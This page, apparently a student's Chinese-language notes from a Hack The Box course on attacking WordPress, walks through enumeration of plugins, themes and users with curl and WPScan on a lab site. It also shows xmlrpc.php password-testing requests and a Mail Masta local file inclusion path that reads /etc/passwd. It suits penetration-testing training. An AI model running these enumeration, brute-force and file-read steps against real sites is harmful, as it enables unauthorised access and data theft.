+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">...SNIP...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...SNIP...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在较旧的WordPress版本中，另一个发现版本信息的来源是WordPress根目录中的<code>readme.html</code>文件。</p>
+<h2 id="插件和主题枚举"><a href="#插件和主题枚举" class="headerlink" title="插件和主题枚举"></a>插件和主题枚举</h2><p>我们还可以通过检查页面源代码或使用<code>cURL</code>和其他命令行实用程序过滤信息来手动查看源代码，从而找到有关已安装插件的信息。</p>
+<h4 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2</span><br><span class="line"></span><br><span class="line">http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1</span><br><span class="line">http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1</span><br><span class="line">http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Themes"><a href="#Themes" class="headerlink" title="Themes"></a>Themes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2</span><br><span class="line"></span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3</span><br><span class="line">http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3</span><br><span class="line">background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>响应头还可能包含特定插件的版本号。</p>
+<p>然而，并非所有已安装的插件和主题都可以被动地被发现。在这种情况下，我们必须主动向服务器发送请求来枚举它们。我们可以通过发送指向服务器上可能存在的目录或文件的GET请求来实现这一点。如果目录或文件确实存在，我们将获得对目录或文件的访问权限，或者将从Web服务器收到重定向响应，指示内容确实存在。然而，我们无法直接访问它。</p>
+<h4 id="插件活动枚举"><a href="#插件活动枚举" class="headerlink" title="插件活动枚举"></a>插件活动枚举</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta</span><br><span class="line"></span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Date: Wed, 13 May 2020 20:08:23 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/</span><br><span class="line">Content-Length: 356</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果内容不存在，我们将收到<code>404 Not Found error</code>。</p>
+<p>插件活动枚举                </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin</span><br><span class="line"></span><br><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">Date: Wed, 13 May 2020 20:08:18 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Expires: Wed, 11 Jan 1984 05:00:00 GMT</span><br><span class="line">Cache-Control: no-cache, must-revalidate, max-age=0</span><br><span class="line">Link: &lt;http://blog.inlanefreight.com/index.php/wp-json/&gt;; rel="https://api.w.org/"</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这同样适用于已安装的主题。</p>
+<p>为了加快枚举速度，我们还可以编写一个简单的bash脚本，或者使用诸如<code>wfuzz</code>或<code>WPScan</code>之类的工具来自动化枚举过程。</p>
+<h2 id="目录索引"><a href="#目录索引" class="headerlink" title="目录索引"></a>目录索引</h2><p>活跃的插件不应该是我们在评估WordPress网站时唯一关注的领域。即使插件被停用，它仍然可以访问，因此我们可以访问其相关的脚本和函数。停用易受攻击的插件并不能提高WordPress网站的安全性。最好的做法是删除或更新任何未使用的插件。</p>
+<p>下面的示例显示了一个禁用的插件。</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/17/plugin-deactivated3.png" alt="image"></p>
+<p>如果我们浏览到plugins目录，我们可以看到我们仍然可以访问<code>Mail Masta</code>插件。                                                                 </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/17/plugin-mailmasta2.png" alt="img"></p>
+<p>我们还可以使用cURL查看目录列表，并使用<code>html2text</code>将HTML输出转换为易读的格式。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text</span><br><span class="line"></span><br><span class="line">****** Index of /wp-content/plugins/mail-masta ******</span><br><span class="line">[[ICO]]       Name                 Last_modified    Size Description</span><br><span class="line">===========================================================================</span><br><span class="line">[[PARENTDIR]] Parent_Directory                         -  </span><br><span class="line">[[DIR]]       amazon_api/          2020-05-13 18:01    -  </span><br><span class="line">[[DIR]]       inc/                 2020-05-13 18:01    -  </span><br><span class="line">[[DIR]]       lib/                 2020-05-13 18:01    -  </span><br><span class="line">[[   ]]       plugin-interface.php 2020-05-13 18:01  88K  </span><br><span class="line">[[TXT]]       readme.txt           2020-05-13 18:01 2.2K  </span><br><span class="line">===========================================================================</span><br><span class="line">     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这种类型的访问称为<code>Directory Indexing</code>。它允许我们浏览文件夹并访问可能包含敏感信息或易受攻击代码的文件。最佳做法是禁用Web服务器上的目录索引，这样潜在的攻击者就无法直接访问网站正常运行所需的文件或文件夹以外的任何文件或文件夹。</p>
+<h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>枚举有效用户列表是WordPress安全评估的关键阶段。有了这个列表，我们可以猜测默认凭据或执行暴力密码攻击。如果成功，我们可以以作者甚至管理员的身份登录到WordPress后端。这种访问可能被用来修改WordPress网站，甚至与底层Web服务器进行交互。</p>
+<p>有两种方法可以执行手动用户名枚举。</p>
+<h3 id="第一方法"><a href="#第一方法" class="headerlink" title="第一方法"></a>第一方法</h3><p>第一种方法是查看帖子以发现分配给用户的ID及其对应的用户名。如果我们将鼠标移到标题为“by admin”的帖子作者链接上，如下图所示，则会在Web浏览器的左下角显示指向用户帐户的链接。</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/17/by-admin.png" alt="image"></p>
+<p><code>admin</code>用户通常被分配用户ID <code>1</code>。我们可以通过在URL中为<code>author</code>参数指定用户ID来确认这一点。</p>
+<p><a target="_blank" rel="noopener" href="http://blog.inlanefreight.com/?author=1">http://blog.inlanefreight.com/?author=1</a></p>
+<p>这也可以通过命令行中的<code>cURL</code>来完成。下面输出中的HTTP响应显示了与用户ID对应的作者。<code>Location</code>头中的URL确认此用户ID属于<code>admin</code>用户。</p>
+<h4 id="现有用户"><a href="#现有用户" class="headerlink" title="现有用户"></a>现有用户</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Date: Wed, 13 May 2020 20:47:08 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">X-Redirect-By: WordPress</span><br><span class="line">Location: http://blog.inlanefreight.com/index.php/author/admin/</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上面的<code>cURL</code>请求然后将我们重定向到用户的个人资料页面或主登录页面。如果用户不存在，我们会收到<code>404 Not Found error</code>。</p>
+<h4 id="非现有用户"><a href="#非现有用户" class="headerlink" title="非现有用户"></a>非现有用户</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=100</span><br><span class="line"></span><br><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">Date: Wed, 13 May 2020 20:47:14 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Expires: Wed, 11 Jan 1984 05:00:00 GMT</span><br><span class="line">Cache-Control: no-cache, must-revalidate, max-age=0</span><br><span class="line">Link: &lt;http://blog.inlanefreight.com/index.php/wp-json/&gt;; rel="https://api.w.org/"</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="二方法"><a href="#二方法" class="headerlink" title="二方法"></a>二方法</h3><p>第二种方法需要与<code>JSON</code>端点进行交互，这允许我们获得用户列表。这在4.7.1版本之后的WordPress核心中进行了更改，更高版本仅显示用户是否已配置。在此版本之前，默认情况下会显示所有已发布帖子的用户。</p>
+<h4 id="JSON-Endpoint"><a href="#JSON-Endpoint" class="headerlink" title="JSON Endpoint"></a>JSON Endpoint</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  {</span><br><span class="line">    "id": 1,</span><br><span class="line">    "name": "admin",</span><br><span class="line">    "url": "",</span><br><span class="line">    "description": "",</span><br><span class="line">    "link": "http://blog.inlanefreight.com/index.php/author/admin/",</span><br><span class="line">    &lt;SNIP&gt;</span><br><span class="line">  },</span><br><span class="line">  {</span><br><span class="line">    "id": 2,</span><br><span class="line">    "name": "ch4p",</span><br><span class="line">    "url": "",</span><br><span class="line">    "description": "",</span><br><span class="line">    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/",</span><br><span class="line">    &lt;SNIP&gt;</span><br><span class="line">  },</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>一旦我们有了有效用户的列表，我们就可以发起密码暴力破解攻击，试图访问WordPress后端。此攻击可通过登录页面或<code>xmlrpc.php</code>页面执行。</p>
+<p>如果针对<code>xmlrpc.php</code>的POST请求包含有效凭据，我们将收到以下输出：</p>
+<h4 id="cURL-POST请求"><a href="#cURL-POST请求" class="headerlink" title="cURL - POST请求"></a>cURL - POST请求</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;methodResponse&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">      &lt;array&gt;&lt;data&gt;</span><br><span class="line">  &lt;value&gt;&lt;struct&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;url&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;blogid&lt;/name&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;blogName&lt;/name&gt;&lt;value&gt;&lt;string&gt;Inlanefreight&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">  &lt;member&gt;&lt;name&gt;xmlrpc&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/xmlrpc.php&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span><br><span class="line">&lt;/struct&gt;&lt;/value&gt;</span><br><span class="line">&lt;/data&gt;&lt;/array&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodResponse&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果凭证无效，我们将收到<code>403 faultCode</code>错误。</p>
+<h4 id="无效的凭据-403禁止访问"><a href="#无效的凭据-403禁止访问" class="headerlink" title="无效的凭据- 403禁止访问"></a>无效的凭据- 403禁止访问</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;asdasd&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;methodResponse&gt;</span><br><span class="line">  &lt;fault&gt;</span><br><span class="line">    &lt;value&gt;</span><br><span class="line">      &lt;struct&gt;</span><br><span class="line">        &lt;member&gt;</span><br><span class="line">          &lt;name&gt;faultCode&lt;/name&gt;</span><br><span class="line">          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;</span><br><span class="line">        &lt;/member&gt;</span><br><span class="line">        &lt;member&gt;</span><br><span class="line">          &lt;name&gt;faultString&lt;/name&gt;</span><br><span class="line">          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;</span><br><span class="line">        &lt;/member&gt;</span><br><span class="line">      &lt;/struct&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/fault&gt;</span><br><span class="line">&lt;/methodResponse&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后几节介绍了几种对WordPress实例执行手动枚举的方法。在尝试使用自动化工具之前，理解手动方法是至关重要的。虽然自动化工具大大加快了渗透测试过程，但我们有责任了解它们对我们正在评估的系统的影响。如果任何自动化工具无法正常工作或提供意外输出，对手动枚举方法的深入了解也将有助于故障排除。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://94.237.59.185:31149/xmlrpc.php |grep "value" |wc</span><br></pre></td></tr></tbody></table></figure>
+
+<p>80个</p>
+<h2 id="WPScan-Overview"><a href="#WPScan-Overview" class="headerlink" title="WPScan Overview"></a>WPScan Overview</h2><h2 id="使用WPScan"><a href="#使用WPScan" class="headerlink" title="使用WPScan"></a>使用WPScan</h2><p><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">WPScan</a>是一个自动化的WordPress扫描器和枚举工具。它确定WordPress网站使用的各种主题和插件是否过时或易受攻击。它默认安装在Parrot OS上，但也可以使用<code>gem</code>手动安装。                                        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ gem install wpscan</span><br></pre></td></tr></tbody></table></figure>
+
+<p>安装完成后，我们可以发出一个命令，如<code>wpscan --hh</code>来验证安装。此命令将显示包含所有可用命令行开关的用法菜单。                                                                    </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ wpscan --hh</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">                               </span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">Usage: wpscan [options]</span><br><span class="line">        --url URL                                 The URL of the blog to scan</span><br><span class="line">                                                  Allowed Protocols: http, https</span><br><span class="line">                                                  Default Protocol if none provided: http</span><br><span class="line">                                                  This option is mandatory unless update or help or hh or version is/are supplied</span><br><span class="line">    -h, --help                                    Display the simple help and exit</span><br><span class="line">        --hh                                      Display the full help and exit</span><br><span class="line">        --version                                 Display the version and exit</span><br><span class="line">        --ignore-main-redirect                    Ignore the main redirect (if any) and scan the target url</span><br><span class="line">    -v, --verbose                                 Verbose mode</span><br><span class="line">        --[no-]banner                             Whether or not to display the banner</span><br><span class="line">                                                  Default: true</span><br><span class="line">        --max-scan-duration SECONDS               Abort the scan if it exceeds the time provided in seconds</span><br><span class="line">    -o, --output FILE                             Output to FILE</span><br><span class="line">    -f, --format FORMAT                           Output results in the format supplied</span><br><span class="line">                                                  Available choices: cli-no-colour, cli-no-color, json, cli</span><br><span class="line">		&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以指定各种枚举选项，例如易受攻击的插件、所有插件、用户枚举等。了解我们可用的所有选项并根据目标（即，我们只是有兴趣看看WordPress网站是否使用任何易受攻击的插件，我们是否需要对网站的各个方面进行全面审计，或者我们只是有兴趣创建一个用户列表，用于暴力破解密码猜测攻击？）。</p>
+<p>WPScan可以从外部来源获取漏洞信息，以增强我们的扫描。我们可以从<a target="_blank" rel="noopener" href="https://wpvulndb.com/">WPVulnDB</a>获得一个API令牌，WPScan使用该令牌扫描漏洞并利用概念证明（POC）和报告。免费计划每天最多允许50个请求。要使用WPVulnDB数据库，只需创建一个帐户并从用户页面复制API令牌。然后可以使用<code>--api-token</code>参数将此令牌提供给WPScan。</p>
+<p>使用下面的Parrot实例，通过打开一个shell并发出命令<code>wpscan --hh</code>来查看各种WPScan选项。</p>
+<h2 id="WPScan枚举"><a href="#WPScan枚举" class="headerlink" title="WPScan枚举"></a>WPScan枚举</h2><h3 id="使用WPScan枚举网站"><a href="#使用WPScan枚举网站" class="headerlink" title="使用WPScan枚举网站"></a>使用WPScan枚举网站</h3><p><code>--enumerate</code>标志用于枚举WordPress应用程序的各种组件，例如插件，主题和用户。默认情况下，WPScan枚举易受攻击的插件、主题、用户、媒体和备份。但是，可以提供特定的参数来将枚举限制为特定的组件。例如，可以使用参数<code>--enumerate ap</code>枚举所有插件。让我们对一个WordPress网站运行一个普通的枚举扫描。</p>
+<p>注意：默认使用的线程数是5，但是，可以使用“-t”标志来更改此值。</p>
+<h4 id="WPScan枚举-1"><a href="#WPScan枚举-1" class="headerlink" title="WPScan枚举"></a>WPScan枚举</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[+] URL: http://blog.inlanefreight.com/                                                   </span><br><span class="line"></span><br><span class="line">[+] Headers                                                                 </span><br><span class="line">|  - Server: Apache/2.4.38 (Debian)</span><br><span class="line">|  - X-Powered-By: PHP/7.3.15</span><br><span class="line">| Found By: Headers (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://blog.inlanefreight.com/xmlrpc.php</span><br><span class="line">| Found By: Direct Access (Aggressive Detection)</span><br><span class="line">|  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.com/wp-cron.php</span><br><span class="line">| Found By: Direct Access (Aggressive Detection)</span><br><span class="line">|  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.3.2 identified (Latest, released on 2019-12-18).</span><br><span class="line">| Found By: Rss Generator (Passive Detection)</span><br><span class="line">|  - http://blog.inlanefreight.com/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwenty</span><br><span class="line">| Location: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/</span><br><span class="line">| Readme: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/readme.txt</span><br><span class="line">| [!] The version is out of date, the latest version is 1.2</span><br><span class="line">| Style Name: Twenty Twenty </span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line">[+] mail-masta</span><br><span class="line">| Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/                 </span><br><span class="line">| Latest Version: 1.0 (up to date)</span><br><span class="line">| Found By: Urls In Homepage (Passive Detection)</span><br><span class="line">| [!] 2 vulnerabilities identified:</span><br><span class="line">|</span><br><span class="line">| [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)</span><br><span class="line">|      - https://www.exploit-db.com/exploits/40290/ </span><br><span class="line">| [!] Title: Mail Masta 1.0 - Multiple SQL Injection</span><br><span class="line">|      - https://wpvulndb.com/vulnerabilities/8740                                                     </span><br><span class="line">[+] wp-google-places-review-slider</span><br><span class="line">| [!] 1 vulnerability identified:</span><br><span class="line">| [!] Title: WP Google Review Slider &lt;= 6.1 - Authenticated SQL Injection</span><br><span class="line">|     Reference: https://wpvulndb.com/vulnerabilities/9933          </span><br><span class="line"></span><br><span class="line">[i] No themes Found.  </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[i] No Medias Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[i] User(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] david</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[+] roger</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>WPScan使用各种被动和主动方法来确定版本和漏洞，如上面的扫描输出所示。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --url http://94.237.59.185:31149 -e ap</span><br></pre></td></tr></tbody></table></figure>
+
+<p>1.5.34</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="利用易受攻击的插件"><a href="#利用易受攻击的插件" class="headerlink" title="利用易受攻击的插件"></a>利用易受攻击的插件</h2><h3 id="利用WPScan结果"><a href="#利用WPScan结果" class="headerlink" title="利用WPScan结果"></a>利用WPScan结果</h3><p>WPScan生成的报告告诉我们，该网站使用的是较旧版本的WordPress（5.3.2）和过时的主题<code>Twenty Twenty</code>。WPScan发现了两个易受攻击的插件<code>Mail Masta 1.0</code>和<code>Google Review Slider</code>。此版本的<code>Mail Masta</code>插件已知易受SQL注入和本地文件包含（LFI）攻击。报告输出还包含指向PoC的URL，这些URL提供了有关如何利用这些漏洞的信息。</p>
+<p>让我们根据这个exploit-db<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40290/">报告来</a>验证LFI是否可以被利用。该漏洞指出，任何未经身份验证的用户都可以通过以下路径读取本地文件：<code>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code>。</p>
+<h4 id="使用浏览器的LFI"><a href="#使用浏览器的LFI" class="headerlink" title="使用浏览器的LFI"></a>使用浏览器的LFI</h4><p><img src="https://academy.hackthebox.com/storage/modules/17/WP_lfi.png" alt="img"></p>
+<p>我们还可以在命令行上使用cURL验证此漏洞。</p>
